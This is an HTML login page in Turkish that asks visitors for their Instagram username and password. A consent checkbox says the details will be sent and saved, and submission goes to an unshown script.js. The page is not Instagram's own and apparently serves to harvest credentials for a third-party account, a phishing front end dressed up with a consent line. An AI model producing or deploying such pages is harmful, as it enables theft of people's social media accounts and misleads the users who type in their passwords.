<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kullanıcı Giriş Ekranı</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Giriş Ekranı</h1>
        <p>Lütfen bilgilerinizi girin. Bu bilgiler sizin izninizle kaydedilecektir.</p>
        <form id="loginForm">
            <label for="username">Instagram Kullanıcı Adınız</label>
            <input type="text" id="username" name="username" placeholder="Kullanıcı adınızı girin" required>
            
            <label for="password">Instagram Şifreniz</label>
            <input type="password" id="password" name="password" placeholder="Şifrenizi girin" required>
            
            <div class="disclaimer">
                <input type="checkbox" id="consent" required>
                <label for="consent">Bilgilerimin gönderileceğini ve kaydedileceğini onaylıyorum.</label>
            </div>
            
            <button type="submit">Gönder</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
